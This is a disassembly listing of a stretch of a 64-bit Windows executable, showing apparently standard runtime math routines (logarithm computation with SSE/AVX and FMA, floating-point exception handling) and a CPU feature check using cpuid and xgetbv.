   14000c430:	f2 0f 59 d2          	mulsd  %xmm2,%xmm2
   14000c434:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000c438:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000c43c:	f2 0f 10 15 bc 4e 00 	movsd  0x4ebc(%rip),%xmm2        # 0x140011300
   14000c443:	00 
   14000c444:	f2 0f 58 e5          	addsd  %xmm5,%xmm4
   14000c448:	f2 0f 5c e6          	subsd  %xmm6,%xmm4
   14000c44c:	f2 0f 10 35 9c 4e 00 	movsd  0x4e9c(%rip),%xmm6        # 0x1400112f0
   14000c453:	00 
   14000c454:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000c458:	66 0f db 1d 20 50 00 	pand   0x5020(%rip),%xmm3        # 0x140011480
   14000c45f:	00 
   14000c460:	f2 0f 5c c3          	subsd  %xmm3,%xmm0
   14000c464:	f2 0f 58 e0          	addsd  %xmm0,%xmm4
   14000c468:	66 0f 28 c3          	movapd %xmm3,%xmm0
   14000c46c:	66 0f 28 cc          	movapd %xmm4,%xmm1
   14000c470:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000c474:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000c478:	f2 0f 59 ce          	mulsd  %xmm6,%xmm1
   14000c47c:	f2 0f 59 de          	mulsd  %xmm6,%xmm3
   14000c480:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000c484:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   14000c488:	f2 0f 58 c3          	addsd  %xmm3,%xmm0
   14000c48c:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000c492:	48 83 c4 58          	add    $0x58,%rsp
   14000c496:	c3                   	ret
   14000c497:	66 0f eb 15 a1 4e 00 	por    0x4ea1(%rip),%xmm2        # 0x140011340
   14000c49e:	00 
   14000c49f:	f2 0f 5c 15 99 4e 00 	subsd  0x4e99(%rip),%xmm2        # 0x140011340
   14000c4a6:	00 
   14000c4a7:	f2 0f 10 ea          	movsd  %xmm2,%xmm5
   14000c4ab:	66 0f db 15 fd 4d 00 	pand   0x4dfd(%rip),%xmm2        # 0x1400112b0
   14000c4b2:	00 
   14000c4b3:	66 48 0f 7e d0       	movq   %xmm2,%rax
   14000c4b8:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
   14000c4bd:	66 0f fa 2d 1b 4f 00 	psubd  0x4f1b(%rip),%xmm5        # 0x1400113e0
   14000c4c4:	00 
   14000c4c5:	f3 0f e6 f5          	cvtdq2pd %xmm5,%xmm6
   14000c4c9:	e9 f1 fd ff ff       	jmp    0x14000c2bf
   14000c4ce:	66 90                	xchg   %ax,%ax
   14000c4d0:	75 1e                	jne    0x14000c4f0
   14000c4d2:	f2 0f 10 0d 76 4d 00 	movsd  0x4d76(%rip),%xmm1        # 0x140011250
   14000c4d9:	00 
   14000c4da:	44 8b 05 af 4f 00 00 	mov    0x4faf(%rip),%r8d        # 0x140011490
   14000c4e1:	e8 62 06 00 00       	call   0x14000cb48
   14000c4e6:	eb 48                	jmp    0x14000c530
   14000c4e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000c4ef:	00 
   14000c4f0:	f2 0f 10 0d 78 4d 00 	movsd  0x4d78(%rip),%xmm1        # 0x140011270
   14000c4f7:	00 
   14000c4f8:	44 8b 05 95 4f 00 00 	mov    0x4f95(%rip),%r8d        # 0x140011494
   14000c4ff:	e8 44 06 00 00       	call   0x14000cb48
   14000c504:	eb 2a                	jmp    0x14000c530
   14000c506:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000c50d:	00 00 00 
   14000c510:	48 3b 05 49 4d 00 00 	cmp    0x4d49(%rip),%rax        # 0x140011260
   14000c517:	74 17                	je     0x14000c530
   14000c519:	48 3b 05 30 4d 00 00 	cmp    0x4d30(%rip),%rax        # 0x140011250
   14000c520:	74 ce                	je     0x14000c4f0
   14000c522:	48 0b 05 57 4d 00 00 	or     0x4d57(%rip),%rax        # 0x140011280
   14000c529:	66 48 0f 6e c0       	movq   %rax,%xmm0
   14000c52e:	66 90                	xchg   %ax,%ax
   14000c530:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000c536:	48 83 c4 58          	add    $0x58,%rsp
   14000c53a:	c3                   	ret
   14000c53b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000c540:	48 33 c0             	xor    %rax,%rax
   14000c543:	c5 e1 73 d0 34       	vpsrlq $0x34,%xmm0,%xmm3
   14000c548:	c4 e1 f9 7e c0       	vmovq  %xmm0,%rax
   14000c54d:	c5 e1 fb 1d 3b 4d 00 	vpsubq 0x4d3b(%rip),%xmm3,%xmm3        # 0x140011290
   14000c554:	00 
   14000c555:	c5 fa e6 f3          	vcvtdq2pd %xmm3,%xmm6
   14000c559:	c5 f9 db 2d ff 4c 00 	vpand  0x4cff(%rip),%xmm0,%xmm5        # 0x140011260
   14000c560:	00 
   14000c561:	c5 f9 2f 2d f7 4c 00 	vcomisd 0x4cf7(%rip),%xmm5        # 0x140011260
   14000c568:	00 
   14000c569:	0f 84 41 02 00 00    	je     0x14000c7b0
   14000c56f:	c5 d1 ef ed          	vpxor  %xmm5,%xmm5,%xmm5
   14000c573:	c5 f9 2f c5          	vcomisd %xmm5,%xmm0
   14000c577:	0f 86 e3 01 00 00    	jbe    0x14000c760
   14000c57d:	c5 f9 db 15 2b 4d 00 	vpand  0x4d2b(%rip),%xmm0,%xmm2        # 0x1400112b0
   14000c584:	00 
   14000c585:	c5 fb 5c 25 b3 4d 00 	vsubsd 0x4db3(%rip),%xmm0,%xmm4        # 0x140011340
   14000c58c:	00 
   14000c58d:	c5 f9 2f 35 3b 4e 00 	vcomisd 0x4e3b(%rip),%xmm6        # 0x1400113d0
   14000c594:	00 
   14000c595:	0f 84 8e 01 00 00    	je     0x14000c729
   14000c59b:	c5 f9 db 0d 1d 4d 00 	vpand  0x4d1d(%rip),%xmm0,%xmm1        # 0x1400112c0
   14000c5a2:	00 
   14000c5a3:	c5 f9 db 1d 25 4d 00 	vpand  0x4d25(%rip),%xmm0,%xmm3        # 0x1400112d0
   14000c5aa:	00 
   14000c5ab:	c5 e1 73 f3 01       	vpsllq $0x1,%xmm3,%xmm3
   14000c5b0:	c5 e1 d4 c9          	vpaddq %xmm1,%xmm3,%xmm1
   14000c5b4:	c4 e1 f9 7e c8       	vmovq  %xmm1,%rax
   14000c5b9:	c5 d9 db 25 6f 4e 00 	vpand  0x4e6f(%rip),%xmm4,%xmm4        # 0x140011430
   14000c5c0:	00 
   14000c5c1:	c5 f9 2f 25 27 4e 00 	vcomisd 0x4e27(%rip),%xmm4        # 0x1400113f0
   14000c5c8:	00 
   14000c5c9:	0f 82 b1 00 00 00    	jb     0x14000c680
   14000c5cf:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000c5d3:	c5 e9 eb 15 75 4d 00 	vpor   0x4d75(%rip),%xmm2,%xmm2        # 0x140011350
   14000c5da:	00 
   14000c5db:	c5 f1 eb 0d 6d 4d 00 	vpor   0x4d6d(%rip),%xmm1,%xmm1        # 0x140011350
   14000c5e2:	00 
   14000c5e3:	4c 8d 0d d6 5e 00 00 	lea    0x5ed6(%rip),%r9        # 0x1400124c0
   14000c5ea:	c5 f3 5c ca          	vsubsd %xmm2,%xmm1,%xmm1
   14000c5ee:	c4 c1 73 59 0c c1    	vmulsd (%r9,%rax,8),%xmm1,%xmm1
   14000c5f4:	4c 8d 0d a5 4e 00 00 	lea    0x4ea5(%rip),%r9        # 0x1400114a0
   14000c5fb:	c5 f3 59 c1          	vmulsd %xmm1,%xmm1,%xmm0
   14000c5ff:	c5 fb 10 1d b9 4d 00 	vmovsd 0x4db9(%rip),%xmm3        # 0x1400113c0
   14000c606:	00 
   14000c607:	c5 fb 10 2d 81 4d 00 	vmovsd 0x4d81(%rip),%xmm5        # 0x140011390
   14000c60e:	00 
   14000c60f:	c4 e2 f1 a9 1d 98 4d 	vfmadd213sd 0x4d98(%rip),%xmm1,%xmm3        # 0x1400113b0
   14000c616:	00 00 
   14000c618:	c4 e2 f1 a9 2d 2f 4d 	vfmadd213sd 0x4d2f(%rip),%xmm1,%xmm5        # 0x140011350
   14000c61f:	00 00 
   14000c621:	f2 0f 10 e0          	movsd  %xmm0,%xmm4
   14000c625:	c4 e2 f1 a9 1d 72 4d 	vfmadd213sd 0x4d72(%rip),%xmm1,%xmm3        # 0x1400113a0
   14000c62c:	00 00 
   14000c62e:	c5 fb 59 e0          	vmulsd %xmm0,%xmm0,%xmm4
   14000c632:	c4 e2 d1 b9 c8       	vfmadd231sd %xmm0,%xmm5,%xmm1
   14000c637:	c4 e2 e1 b9 cc       	vfmadd231sd %xmm4,%xmm3,%xmm1
   14000c63c:	c5 f3 59 0d 9c 4c 00 	vmulsd 0x4c9c(%rip),%xmm1,%xmm1        # 0x1400112e0
   14000c643:	00 
   14000c644:	c5 fb 10 2d d4 4c 00 	vmovsd 0x4cd4(%rip),%xmm5        # 0x140011320
   14000c64b:	00 
   14000c64c:	c4 e2 c9 ab e9       	vfmsub213sd %xmm1,%xmm6,%xmm5
   14000c651:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000c657:	48 8d 15 52 56 00 00 	lea    0x5652(%rip),%rdx        # 0x140011cb0
   14000c65e:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000c663:	c5 eb 58 d5          	vaddsd %xmm5,%xmm2,%xmm2
   14000c667:	c4 e2 c9 b9 05 a0 4c 	vfmadd231sd 0x4ca0(%rip),%xmm6,%xmm0        # 0x140011310
   14000c66e:	00 00 
   14000c670:	c5 fb 58 c2          	vaddsd %xmm2,%xmm0,%xmm0
   14000c674:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000c67a:	48 83 c4 58          	add    $0x58,%rsp
   14000c67e:	c3                   	ret
   14000c67f:	90                   	nop
   14000c680:	c5 fb 10 15 a8 4c 00 	vmovsd 0x4ca8(%rip),%xmm2        # 0x140011330
   14000c687:	00 
   14000c688:	c5 fb 5c 05 b0 4c 00 	vsubsd 0x4cb0(%rip),%xmm0,%xmm0        # 0x140011340
   14000c68f:	00 
   14000c690:	c5 eb 58 d0          	vaddsd %xmm0,%xmm2,%xmm2
   14000c694:	c5 fb 5e ca          	vdivsd %xmm2,%xmm0,%xmm1
   14000c698:	c5 fb 10 25 b0 4d 00 	vmovsd 0x4db0(%rip),%xmm4        # 0x140011450
   14000c69f:	00 
   14000c6a0:	c5 fb 10 2d c8 4d 00 	vmovsd 0x4dc8(%rip),%xmm5        # 0x140011470
   14000c6a7:	00 
   14000c6a8:	c5 fb 59 f1          	vmulsd %xmm1,%xmm0,%xmm6
   14000c6ac:	c5 f3 58 c9          	vaddsd %xmm1,%xmm1,%xmm1
   14000c6b0:	c5 f3 59 d1          	vmulsd %xmm1,%xmm1,%xmm2
   14000c6b4:	c4 e2 e9 a9 25 83 4d 	vfmadd213sd 0x4d83(%rip),%xmm2,%xmm4        # 0x140011440
   14000c6bb:	00 00 
   14000c6bd:	c4 e2 e9 a9 2d 9a 4d 	vfmadd213sd 0x4d9a(%rip),%xmm2,%xmm5        # 0x140011460
   14000c6c4:	00 00 
   14000c6c6:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000c6ca:	c5 db 59 e2          	vmulsd %xmm2,%xmm4,%xmm4
   14000c6ce:	c5 eb 59 d2          	vmulsd %xmm2,%xmm2,%xmm2
   14000c6d2:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000c6d6:	c5 d3 59 ea          	vmulsd %xmm2,%xmm5,%xmm5
   14000c6da:	c5 db 58 e5          	vaddsd %xmm5,%xmm4,%xmm4
   14000c6de:	c5 db 5c e6          	vsubsd %xmm6,%xmm4,%xmm4
   14000c6e2:	c5 f9 db 1d 96 4d 00 	vpand  0x4d96(%rip),%xmm0,%xmm3        # 0x140011480
   14000c6e9:	00 
   14000c6ea:	c5 fb 5c c3          	vsubsd %xmm3,%xmm0,%xmm0
   14000c6ee:	c5 db 58 e0          	vaddsd %xmm0,%xmm4,%xmm4
   14000c6f2:	c5 db 59 0d f6 4b 00 	vmulsd 0x4bf6(%rip),%xmm4,%xmm1        # 0x1400112f0
   14000c6f9:	00 
   14000c6fa:	c5 db 59 25 fe 4b 00 	vmulsd 0x4bfe(%rip),%xmm4,%xmm4        # 0x140011300
   14000c701:	00 
   14000c702:	c5 e3 59 05 f6 4b 00 	vmulsd 0x4bf6(%rip),%xmm3,%xmm0        # 0x140011300
   14000c709:	00 
   14000c70a:	c5 e3 59 1d de 4b 00 	vmulsd 0x4bde(%rip),%xmm3,%xmm3        # 0x1400112f0
   14000c711:	00 
   14000c712:	c5 fb 58 c4          	vaddsd %xmm4,%xmm0,%xmm0
   14000c716:	c5 fb 58 c1          	vaddsd %xmm1,%xmm0,%xmm0
   14000c71a:	c5 fb 58 c3          	vaddsd %xmm3,%xmm0,%xmm0
   14000c71e:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000c724:	48 83 c4 58          	add    $0x58,%rsp
   14000c728:	c3                   	ret
   14000c729:	c5 e9 eb 15 0f 4c 00 	vpor   0x4c0f(%rip),%xmm2,%xmm2        # 0x140011340
   14000c730:	00 
   14000c731:	c5 eb 5c 15 07 4c 00 	vsubsd 0x4c07(%rip),%xmm2,%xmm2        # 0x140011340
   14000c738:	00 
   14000c739:	c5 d1 73 d2 34       	vpsrlq $0x34,%xmm2,%xmm5
   14000c73e:	c5 e9 db 15 6a 4b 00 	vpand  0x4b6a(%rip),%xmm2,%xmm2        # 0x1400112b0
   14000c745:	00 
   14000c746:	c5 f9 28 c2          	vmovapd %xmm2,%xmm0
   14000c74a:	c5 d1 fa 2d 8e 4c 00 	vpsubd 0x4c8e(%rip),%xmm5,%xmm5        # 0x1400113e0
   14000c751:	00 
   14000c752:	c5 fa e6 f5          	vcvtdq2pd %xmm5,%xmm6
   14000c756:	e9 40 fe ff ff       	jmp    0x14000c59b
   14000c75b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000c760:	75 2e                	jne    0x14000c790
   14000c762:	c5 fb 10 0d e6 4a 00 	vmovsd 0x4ae6(%rip),%xmm1        # 0x140011250
   14000c769:	00 
   14000c76a:	44 8b 05 1f 4d 00 00 	mov    0x4d1f(%rip),%r8d        # 0x140011490
   14000c771:	e8 d2 03 00 00       	call   0x14000cb48
   14000c776:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000c77c:	48 83 c4 58          	add    $0x58,%rsp
   14000c780:	c3                   	ret
   14000c781:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000c788:	0f 1f 84 00 00 00 00 
   14000c78f:	00 
   14000c790:	c5 fb 10 0d d8 4a 00 	vmovsd 0x4ad8(%rip),%xmm1        # 0x140011270
   14000c797:	00 
   14000c798:	44 8b 05 f5 4c 00 00 	mov    0x4cf5(%rip),%r8d        # 0x140011494
   14000c79f:	e8 a4 03 00 00       	call   0x14000cb48
   14000c7a4:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000c7aa:	48 83 c4 58          	add    $0x58,%rsp
   14000c7ae:	c3                   	ret
   14000c7af:	90                   	nop
   14000c7b0:	48 3b 05 a9 4a 00 00 	cmp    0x4aa9(%rip),%rax        # 0x140011260
   14000c7b7:	74 27                	je     0x14000c7e0
   14000c7b9:	48 3b 05 90 4a 00 00 	cmp    0x4a90(%rip),%rax        # 0x140011250
   14000c7c0:	74 ce                	je     0x14000c790
   14000c7c2:	48 0b 05 b7 4a 00 00 	or     0x4ab7(%rip),%rax        # 0x140011280
   14000c7c9:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000c7ce:	44 8b 05 c3 4c 00 00 	mov    0x4cc3(%rip),%r8d        # 0x140011498
   14000c7d5:	e8 6e 03 00 00       	call   0x14000cb48
   14000c7da:	eb 04                	jmp    0x14000c7e0
   14000c7dc:	0f 1f 40 00          	nopl   0x0(%rax)
   14000c7e0:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000c7e6:	48 83 c4 58          	add    $0x58,%rsp
   14000c7ea:	c3                   	ret
   14000c7eb:	cc                   	int3
   14000c7ec:	48 8b c4             	mov    %rsp,%rax
   14000c7ef:	53                   	push   %rbx
   14000c7f0:	48 83 ec 50          	sub    $0x50,%rsp
   14000c7f4:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   14000c7fb:	00 00 
   14000c7fd:	8b d9                	mov    %ecx,%ebx
   14000c7ff:	f2 0f 10 8c 24 88 00 	movsd  0x88(%rsp),%xmm1
   14000c806:	00 00 
   14000c808:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000c80d:	89 48 c8             	mov    %ecx,-0x38(%rax)
   14000c810:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000c817:	00 
   14000c818:	f2 0f 11 40 e0       	movsd  %xmm0,-0x20(%rax)
   14000c81d:	f2 0f 11 48 e8       	movsd  %xmm1,-0x18(%rax)
   14000c822:	f2 0f 11 58 d8       	movsd  %xmm3,-0x28(%rax)
   14000c827:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   14000c82b:	e8 28 07 00 00       	call   0x14000cf58
   14000c830:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000c835:	e8 8e 5e ff ff       	call   0x1400026c8
   14000c83a:	85 c0                	test   %eax,%eax
   14000c83c:	75 07                	jne    0x14000c845
   14000c83e:	8b cb                	mov    %ebx,%ecx
   14000c840:	e8 8b 03 00 00       	call   0x14000cbd0
   14000c845:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000c84b:	48 83 c4 50          	add    $0x50,%rsp
   14000c84f:	5b                   	pop    %rbx
   14000c850:	c3                   	ret
   14000c851:	cc                   	int3
   14000c852:	cc                   	int3
   14000c853:	cc                   	int3
   14000c854:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c859:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000c85e:	57                   	push   %rdi
   14000c85f:	48 83 ec 20          	sub    $0x20,%rsp
   14000c863:	8b d9                	mov    %ecx,%ebx
   14000c865:	48 8b f2             	mov    %rdx,%rsi
   14000c868:	83 e3 1f             	and    $0x1f,%ebx
   14000c86b:	8b f9                	mov    %ecx,%edi
   14000c86d:	f6 c1 08             	test   $0x8,%cl
   14000c870:	74 14                	je     0x14000c886
   14000c872:	40 84 f6             	test   %sil,%sil
   14000c875:	79 0f                	jns    0x14000c886
   14000c877:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000c87c:	e8 67 07 00 00       	call   0x14000cfe8
   14000c881:	83 e3 f7             	and    $0xfffffff7,%ebx
   14000c884:	eb 57                	jmp    0x14000c8dd
   14000c886:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000c88b:	40 84 f9             	test   %dil,%cl
   14000c88e:	74 11                	je     0x14000c8a1
   14000c890:	48 0f ba e6 09       	bt     $0x9,%rsi
   14000c895:	73 0a                	jae    0x14000c8a1
   14000c897:	e8 4c 07 00 00       	call   0x14000cfe8
   14000c89c:	83 e3 fb             	and    $0xfffffffb,%ebx
   14000c89f:	eb 3c                	jmp    0x14000c8dd
   14000c8a1:	40 f6 c7 01          	test   $0x1,%dil
   14000c8a5:	74 16                	je     0x14000c8bd
   14000c8a7:	48 0f ba e6 0a       	bt     $0xa,%rsi
   14000c8ac:	73 0f                	jae    0x14000c8bd
   14000c8ae:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000c8b3:	e8 30 07 00 00       	call   0x14000cfe8
   14000c8b8:	83 e3 fe             	and    $0xfffffffe,%ebx
   14000c8bb:	eb 20                	jmp    0x14000c8dd
   14000c8bd:	40 f6 c7 02          	test   $0x2,%dil
   14000c8c1:	74 1a                	je     0x14000c8dd
   14000c8c3:	48 0f ba e6 0b       	bt     $0xb,%rsi
   14000c8c8:	73 13                	jae    0x14000c8dd
   14000c8ca:	40 f6 c7 10          	test   $0x10,%dil
   14000c8ce:	74 0a                	je     0x14000c8da
   14000c8d0:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000c8d5:	e8 0e 07 00 00       	call   0x14000cfe8
   14000c8da:	83 e3 fd             	and    $0xfffffffd,%ebx
   14000c8dd:	40 f6 c7 10          	test   $0x10,%dil
   14000c8e1:	74 14                	je     0x14000c8f7
   14000c8e3:	48 0f ba e6 0c       	bt     $0xc,%rsi
   14000c8e8:	73 0d                	jae    0x14000c8f7
   14000c8ea:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000c8ef:	e8 f4 06 00 00       	call   0x14000cfe8
   14000c8f4:	83 e3 ef             	and    $0xffffffef,%ebx
   14000c8f7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000c8fc:	33 c0                	xor    %eax,%eax
   14000c8fe:	85 db                	test   %ebx,%ebx
   14000c900:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c905:	0f 94 c0             	sete   %al
   14000c908:	48 83 c4 20          	add    $0x20,%rsp
   14000c90c:	5f                   	pop    %rdi
   14000c90d:	c3                   	ret
   14000c90e:	cc                   	int3
   14000c90f:	cc                   	int3
   14000c910:	48 8b c4             	mov    %rsp,%rax
   14000c913:	55                   	push   %rbp
   14000c914:	53                   	push   %rbx
   14000c915:	56                   	push   %rsi
   14000c916:	57                   	push   %rdi
   14000c917:	41 56                	push   %r14
   14000c919:	48 8d 68 c9          	lea    -0x37(%rax),%rbp
   14000c91d:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   14000c924:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   14000c928:	48 8b 05 09 a7 00 00 	mov    0xa709(%rip),%rax        # 0x140017038
   14000c92f:	48 33 c4             	xor    %rsp,%rax
   14000c932:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000c936:	8b f2                	mov    %edx,%esi
   14000c938:	4c 8b f1             	mov    %rcx,%r14
   14000c93b:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000c940:	b9 80 1f 00 00       	mov    $0x1f80,%ecx
   14000c945:	41 8b f9             	mov    %r9d,%edi
   14000c948:	49 8b d8             	mov    %r8,%rbx
   14000c94b:	e8 08 06 00 00       	call   0x14000cf58
   14000c950:	8b 4d 5f             	mov    0x5f(%rbp),%ecx
   14000c953:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000c958:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   14000c95d:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   14000c963:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   14000c968:	f2 0f 11 44 24 48    	movsd  %xmm0,0x48(%rsp)
   14000c96e:	e8 e1 fe ff ff       	call   0x14000c854
   14000c973:	f2 0f 10 75 77       	movsd  0x77(%rbp),%xmm6
   14000c978:	85 c0                	test   %eax,%eax
   14000c97a:	75 40                	jne    0x14000c9bc
   14000c97c:	83 7d 7f 02          	cmpl   $0x2,0x7f(%rbp)
   14000c980:	75 11                	jne    0x14000c993
   14000c982:	8b 45 bf             	mov    -0x41(%rbp),%eax
   14000c985:	83 e0 e3             	and    $0xffffffe3,%eax
   14000c988:	f2 0f 11 75 af       	movsd  %xmm6,-0x51(%rbp)
   14000c98d:	83 c8 03             	or     $0x3,%eax
   14000c990:	89 45 bf             	mov    %eax,-0x41(%rbp)
   14000c993:	44 8b 45 5f          	mov    0x5f(%rbp),%r8d
   14000c997:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   14000c99c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000c9a1:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000c9a6:	48 8d 45 6f          	lea    0x6f(%rbp),%rax
   14000c9aa:	44 8b ce             	mov    %esi,%r9d
   14000c9ad:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000c9b2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c9b7:	e8 44 02 00 00       	call   0x14000cc00
   14000c9bc:	e8 e7 5c ff ff       	call   0x1400026a8
   14000c9c1:	84 c0                	test   %al,%al
   14000c9c3:	74 34                	je     0x14000c9f9
   14000c9c5:	85 ff                	test   %edi,%edi
   14000c9c7:	74 30                	je     0x14000c9f9
   14000c9c9:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000c9ce:	4d 8b c6             	mov    %r14,%r8
   14000c9d1:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   14000c9d7:	8b cf                	mov    %edi,%ecx
   14000c9d9:	f2 0f 10 5d 6f       	movsd  0x6f(%rbp),%xmm3
   14000c9de:	8b 55 67             	mov    0x67(%rbp),%edx
   14000c9e1:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000c9e6:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
   14000c9ec:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   14000c9f2:	e8 f5 fd ff ff       	call   0x14000c7ec
   14000c9f7:	eb 1c                	jmp    0x14000ca15
   14000c9f9:	8b cf                	mov    %edi,%ecx
   14000c9fb:	e8 d0 01 00 00       	call   0x14000cbd0
   14000ca00:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000ca05:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000ca0a:	e8 49 05 00 00       	call   0x14000cf58
   14000ca0f:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   14000ca15:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   14000ca19:	48 33 cc             	xor    %rsp,%rcx
   14000ca1c:	e8 ff 48 ff ff       	call   0x140001320
   14000ca21:	0f 28 b4 24 e0 00 00 	movaps 0xe0(%rsp),%xmm6
   14000ca28:	00 
   14000ca29:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   14000ca30:	41 5e                	pop    %r14
   14000ca32:	5f                   	pop    %rdi
   14000ca33:	5e                   	pop    %rsi
   14000ca34:	5b                   	pop    %rbx
   14000ca35:	5d                   	pop    %rbp
   14000ca36:	c3                   	ret
   14000ca37:	cc                   	int3
   14000ca38:	cc                   	int3
   14000ca39:	cc                   	int3
   14000ca3a:	cc                   	int3
   14000ca3b:	cc                   	int3
   14000ca3c:	cc                   	int3
   14000ca3d:	cc                   	int3
   14000ca3e:	cc                   	int3
   14000ca3f:	cc                   	int3
   14000ca40:	40 53                	rex push %rbx
   14000ca42:	48 83 ec 10          	sub    $0x10,%rsp
   14000ca46:	45 33 c0             	xor    %r8d,%r8d
   14000ca49:	33 c9                	xor    %ecx,%ecx
   14000ca4b:	44 89 05 86 c1 00 00 	mov    %r8d,0xc186(%rip)        # 0x140018bd8
   14000ca52:	45 8d 48 01          	lea    0x1(%r8),%r9d
   14000ca56:	41 8b c1             	mov    %r9d,%eax
   14000ca59:	0f a2                	cpuid
   14000ca5b:	89 04 24             	mov    %eax,(%rsp)
   14000ca5e:	b8 00 10 00 18       	mov    $0x18001000,%eax
   14000ca63:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000ca67:	23 c8                	and    %eax,%ecx
   14000ca69:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000ca6d:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   14000ca71:	3b c8                	cmp    %eax,%ecx
   14000ca73:	75 2c                	jne    0x14000caa1
   14000ca75:	33 c9                	xor    %ecx,%ecx
   14000ca77:	0f 01 d0             	xgetbv
   14000ca7a:	48 c1 e2 20          	shl    $0x20,%rdx
   14000ca7e:	48 0b d0             	or     %rax,%rdx
   14000ca81:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000ca86:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000ca8b:	44 8b 05 46 c1 00 00 	mov    0xc146(%rip),%r8d        # 0x140018bd8
   14000ca92:	24 06                	and    $0x6,%al
   14000ca94:	3c 06                	cmp    $0x6,%al
   14000ca96:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000ca9a:	44 89 05 37 c1 00 00 	mov    %r8d,0xc137(%rip)        # 0x140018bd8
   14000caa1:	44 89 05 34 c1 00 00 	mov    %r8d,0xc134(%rip)        # 0x140018bdc
   14000caa8:	33 c0                	xor    %eax,%eax
   14000caaa:	48 83 c4 10          	add    $0x10,%rsp
   14000caae:	5b                   	pop    %rbx
   14000caaf:	c3                   	ret
   14000cab0:	48 8b c4             	mov    %rsp,%rax
   14000cab3:	48 83 ec 68          	sub    $0x68,%rsp
   14000cab7:	0f 29 70 e8          	movaps %xmm6,-0x18(%rax)
   14000cabb:	0f 28 f1             	movaps %xmm1,%xmm6
   14000cabe:	41 8b d1             	mov    %r9d,%edx
   14000cac1:	0f 28 d8             	movaps %xmm0,%xmm3
   14000cac4:	41 83 e8 01          	sub    $0x1,%r8d
   14000cac8:	74 2a                	je     0x14000caf4
   14000caca:	41 83 f8 01          	cmp    $0x1,%r8d
   14000cace:	75 69                	jne    0x14000cb39
   14000cad0:	44 89 40 d8          	mov    %r8d,-0x28(%rax)
   14000cad4:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000cad7:	f2 0f 11 50 d0       	movsd  %xmm2,-0x30(%rax)
   14000cadc:	45 8b c8             	mov    %r8d,%r9d
   14000cadf:	f2 0f 11 40 c8       	movsd  %xmm0,-0x38(%rax)
   14000cae4:	c7 40 c0 21 00 00 00 	movl   $0x21,-0x40(%rax)
